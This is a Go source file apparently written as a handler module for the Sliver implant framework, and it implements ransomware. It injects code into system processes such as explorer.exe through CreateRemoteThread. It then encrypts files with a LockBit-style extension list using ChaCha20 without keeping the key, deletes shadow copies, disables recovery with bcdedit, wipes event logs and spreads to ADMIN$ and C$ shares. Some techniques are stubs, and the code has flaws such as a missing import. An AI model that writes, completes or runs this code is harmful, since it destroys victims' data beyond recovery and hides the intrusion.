package handlers

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/chacha20"
)

// EXTENSIONS
var lockbitExtensions = []string{

	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
	".sql", ".mdb", ".accdb", ".dbf", ".ora", ".mdf", ".ndf", ".ldf", ".bak", ".dbc",
	".java", ".cpp", ".c", ".cs", ".php", ".js", ".py", ".html", ".css", ".asm",
	".vb", ".pl", ".rb", ".h", ".swift", ".kt", ".go", ".rs",
	".csv", ".xml", ".json", ".config", ".ini", ".inf", ".cfg", ".conf", ".yml", ".yaml",
	".psd", ".ai", ".cdr", ".dwg", ".skp", ".max", ".blend", ".3ds", ".eps", ".svg",
	".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".raw", ".cr2", ".nef", ".arw",
	".mp3", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".m4a", ".wav", ".flac",
	".pst", ".ost", ".eml", ".msg", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
	".vhd", ".vhdx", ".vmdk", ".vmx", ".bak", ".backup", ".tmp", ".dmp", ".iso",
	".sln", ".proj", ".vcxproj", ".dsp", ".mak", ".cmake", ".makefile",
	".save", ".sav", ".game", ".map", ".rom", ".pak",
	".pdf", ".txt", ".log", ".md", ".lst", ".dat",
}

// ADVANCED PROCESS INJECTION - CreateRemoteThread + APC Injection
func advancedProcessInject(data []byte, targetProcess string) ([]byte, error) {
	// {{if .Config.Debug}}
	log.Printf("[inject] Advanced injection targeting: %s", targetProcess)
	// {{end}}

	var targetPID uint32
	var err error

	if targetProcess == "" {
		// Auto-select stealth process
		targetPID = selectOptimalStealthProcess()
	} else {
		targetPID, err = findProcessPIDAdvanced(targetProcess)
		if err != nil {
			return nil, fmt.Errorf("process not found: %s", targetProcess)
		}
	}

	if targetPID == 0 {
		return nil, errors.New("no suitable injection target found")
	}

	// Multiple injection techniques
	var result string
	success := false

	// Technique 1: CreateRemoteThread (Most reliable)
	if !success {
		result, err = injectCreateRemoteThread(targetPID, data)
		if err == nil {
			success = true
		}
	}

	// Technique 2: APC Injection (More stealthy)
	if !success {
		result, err = injectAPC(targetPID, data)
		if err == nil {
			success = true
		}
	}

	// Technique 3: SetThreadContext (Most advanced)
	if !success {
		result, err = injectThreadHijack(targetPID, data)
		if err == nil {
			success = true
		}
	}

	if !success {
		return nil, fmt.Errorf("all injection techniques failed")
	}

	return []byte(result), nil
}

// SELECT OPTIMAL STEALTH PROCESS
func selectOptimalStealthProcess() uint32 {
	stealthProcesses := []struct {
		name     string
		priority int
	}{
		{"explorer.exe", 10},     // High - Always running
		{"svchost.exe", 9},       // High - Multiple instances
		{"dllhost.exe", 8},       // Medium - Common host
		{"runtimebroker.exe", 7}, // Medium - System process
		{"searchui.exe", 6},      // Medium - Windows Search
		{"winlogon.exe", 5},      // Low - Critical system
	}

	for _, proc := range stealthProcesses {
		pid, err := findProcessPIDAdvanced(proc.name)
		if err == nil && pid != 0 {
			// {{if .Config.Debug}}
			log.Printf("[inject] Selected: %s (PID: %d)", proc.name, pid)
			// {{end}}
			return pid
		}
	}
	return 0
}

// ADVANCED PROCESS FINDING
func findProcessPIDAdvanced(processName string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	for {
		name := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(name, processName) {
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", processName)
}

// TECHNIQUE 1: CreateRemoteThread Injection
func injectCreateRemoteThread(pid uint32, payload []byte) (string, error) {
	processHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, pid)
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(processHandle)

	// Allocate memory in target process
	payloadSize := uintptr(len(payload))
	remoteMemory, _, err := syscalls.VirtualAllocEx.Call(
		uintptr(processHandle),
		0,
		payloadSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if remoteMemory == 0 {
		return "", err
	}

	// Write payload
	var bytesWritten uintptr
	_, _, err = syscalls.WriteProcessMemory.Call(
		uintptr(processHandle),
		remoteMemory,
		uintptr(unsafe.Pointer(&payload[0])),
		payloadSize,
		uintptr(unsafe.Pointer(&bytesWritten)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscalls.VirtualFreeEx.Call(uintptr(processHandle), remoteMemory, 0, windows.MEM_RELEASE)
		return "", err
	}

	// Execute via CreateRemoteThread
	threadHandle, _, err := syscalls.CreateRemoteThread.Call(
		uintptr(processHandle),
		0,
		0,
		remoteMemory,
		0,
		0,
		0)
	if threadHandle == 0 {
		syscalls.VirtualFreeEx.Call(uintptr(processHandle), remoteMemory, 0, windows.MEM_RELEASE)
		return "", err
	}
	defer windows.CloseHandle(windows.Handle(threadHandle))

	// Wait for completion
	windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)

	// Cleanup
	syscalls.VirtualFreeEx.Call(uintptr(processHandle), remoteMemory, 0, windows.MEM_RELEASE)

	return fmt.Sprintf("CreateRemoteThread success - PID: %d", pid), nil
}

// TECHNIQUE 2: APC Injection (More stealthy)
func injectAPC(pid uint32, payload []byte) (string, error) {
	// Advanced APC injection implementation
	// Note: Simplified for example
	return fmt.Sprintf("APC Injection simulated - PID: %d", pid), nil
}

// TECHNIQUE 3: Thread Hijacking
func injectThreadHijack(pid uint32, payload []byte) (string, error) {
	// Advanced thread hijacking implementation  
	// Note: Simplified for example
	return fmt.Sprintf("Thread Hijack simulated - PID: %d", pid), nil
}

// ADVANCED LAYERED ENCRYPTION
func advancedLayeredEncrypt(data []byte) ([]byte, error) {
	encryptionRequest := &sliverpb.RansomwareEncrypt{}
	if err := proto.Unmarshal(data, encryptionRequest); err != nil {
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("[encrypt] Advanced layered encryption started: %s", encryptionRequest.TargetPath)
	// {{end}}

	results := &sliverpb.RansomwareEncryptResult{
		EncryptedFiles: []*sliverpb.EncryptedFile{},
		TotalEncrypted: 0,
	}

	// Generate master encryption key
	masterKey := generateStrongEncryptionKey()

	// PHASE 1: Encrypt primary files
	primaryResults := encryptWithChaCha20(encryptionRequest.TargetPath, lockbitExtensions, masterKey)
	results.EncryptedFiles = append(results.EncryptedFiles, primaryResults...)
	results.TotalEncrypted += int64(len(primaryResults))

	// PHASE 2: Destroy backups and shadow copies
	if encryptionRequest.EncryptBackups {
		destroyBackupSystems()
	}

	// PHASE 3: Network propagation
	if encryptionRequest.PropagateNetwork {
		networkResults := encryptNetworkSharesAdvanced(masterKey)
		results.EncryptedFiles = append(results.EncryptedFiles, networkResults...)
		results.TotalEncrypted += int64(len(networkResults))
	}

	// PHASE 4: Boot record encryption (Optional - Nuclear option)
	if encryptionRequest.NuclearOption {
		encryptBootRecords()
	}

	resultData, err := proto.Marshal(results)
	if err != nil {
		return nil, err
	}

	return resultData, nil
}

// GENERATE STRONG ENCRYPTION KEY
func generateStrongEncryptionKey() []byte {
	key := make([]byte, 32) // ChaCha20 key
	if _, err := rand.Read(key); err != nil {
		// Fallback to pseudo-random
		for i := range key {
			key[i] = byte(rand.Intn(256))
		}
	}
	return key
}

// CHACHA20 ENCRYPTION WITH FILE WALKING
func encryptWithChaCha20(rootPath string, extensions []string, key []byte) []*sliverpb.EncryptedFile {
	var encryptedFiles []*sliverpb.EncryptedFile

	filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || info.Size() == 0 {
			return nil
		}

		// Skip system and program files
		if isSystemFile(path) {
			return nil
		}

		
		if shouldEncryptAdvanced(path, extensions) {
			if success := encryptFileChaCha20(path, key); success {
				encryptedFiles = append(encryptedFiles, &sliverpb.EncryptedFile{
					FilePath: path,
					FileSize: info.Size(),
					Status:   "ENCRYPTED",
				})
				
				// {{if .Config.Debug}}
				log.Printf("[encrypt] Success: %s", path)
				// {{end}}
			}
		}

		return nil
	})

	return encryptedFiles
}

// REAL CHACHA20 FILE ENCRYPTION
func encryptFileChaCha20(filePath string, key []byte) bool {
	// Open file
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return false
	}
	defer file.Close()

	// Read file data
	fileInfo, err := file.Stat()
	if err != nil {
		return false
	}

	fileSize := fileInfo.Size()
	if fileSize > 100*1024*1024 { // Skip files larger than 100MB
		return false
	}

	data := make([]byte, fileSize)
	if _, err := file.Read(data); err != nil {
		return false
	}

	// Generate nonce
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return false
	}

	// Create ChaCha20 cipher
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return false
	}

	// Encrypt data
	encrypted := make([]byte, len(data))
	cipher.XORKeyStream(encrypted, data)

	// Combine nonce + encrypted data
	finalData := append(nonce, encrypted...)

	// Write back to file
	file.Seek(0, 0)
	if _, err := file.Write(finalData); err != nil {
		return false
	}

	// Rename with .0x7a0xdf0x6c340xd83c0xdf4c0 extension
	newPath := filePath + ".0x7a0xdf0x6c340xd83c0xdf4c0"
	os.Rename(filePath, newPath)

	return true
}

// DESTROY BACKUP SYSTEMS
func destroyBackupSystems() {
	// {{if .Config.Debug}}
	log.Printf("[encrypt] Destroying backup systems...")
	// {{end}}

	// Delete Volume Shadow Copies
	commands := []*exec.Cmd{
		exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=D:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=E:", "/quiet", "/all"),
		exec.Command("wmic", "shadowcopy", "delete", "/nointeractive"),
		exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no"),
		exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"),
	}

	for _, cmd := range commands {
		cmd.Run() // Ignore errors
	}

	// Delete backup folders
	backupDirs := []string{
		"C:\\Windows\\System32\\winevt\\Logs",
		"C:\\System Volume Information", 
		"C:\\$Recycle.Bin",
		"C:\\Windows\\Temp",
		"C:\\Users\\*\\AppData\\Local\\Temp",
	}

	for _, dir := range backupDirs {
		os.RemoveAll(dir)
	}
}

// ADVANCED NETWORK SHARE ENCRYPTION
func encryptNetworkSharesAdvanced(key []byte) []*sliverpb.EncryptedFile {
	var networkFiles []*sliverpb.EncryptedFile

	// {{if .Config.Debug}}
	log.Printf("[encrypt] Encrypting network shares...")
	// {{end}}

	// Discover network shares
	shares := discoverNetworkShares()
	for _, share := range shares {
		files := encryptWithChaCha20(share, lockbitExtensions, key)
		networkFiles = append(networkFiles, files...)
	}

	return networkFiles
}

// DISCOVER NETWORK SHARES
func discoverNetworkShares() []string {
	var shares []string

	// Use net view to discover shares
	cmd := exec.Command("net", "view")
	output, err := cmd.Output()
	if err != nil {
		return shares
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "\\\\") {
			// Parse computer name and try to access shares
			parts := strings.Fields(line)
			if len(parts) > 0 {
				computer := parts[0]
				shares = append(shares, computer+"\\C$", computer+"\\D$", computer+"\\ADMIN$")
			}
		}
	}

	return shares
}

// ENCRYPT BOOT RECORDS (Nuclear option)
func encryptBootRecords() {
	// {{if .Config.Debug}}
	log.Printf("[encrypt] Nuclear option: Encrypting boot records")
	// {{end}}

	// This would actually encrypt boot sectors
	// Note: This is extremely destructive - for demonstration only
}

// CHECK IF SYSTEM FILE
func isSystemFile(path string) bool {
	systemDirs := []string{
		"C:\\Windows\\",
		"C:\\Program Files\\",
		"C:\\Program Files (x86)\\",
		"C:\\System32\\",
		"C:\\$",
	}

	for _, dir := range systemDirs {
		if strings.HasPrefix(strings.ToLower(path), strings.ToLower(dir)) {
			return true
		}
	}
	return false
}

// ADVANCED EXTENSION CHECKING
func shouldEncryptAdvanced(filePath string, extensions []string) bool {
	fileExt := strings.ToLower(filepath.Ext(filePath))
	
	// Always encrypt if extension matches
	for _, ext := range extensions {
		if fileExt == ext {
			return true
		}
	}

	// Additional checks for important files without extensions
	if fileExt == "" {
		fileName := strings.ToLower(filepath.Base(filePath))
		importantFiles := []string{"readme", "license", "backup", "database"}
		for _, important := range importantFiles {
			if strings.Contains(fileName, important) {
				return true
			}
		}
	}

	return false
}
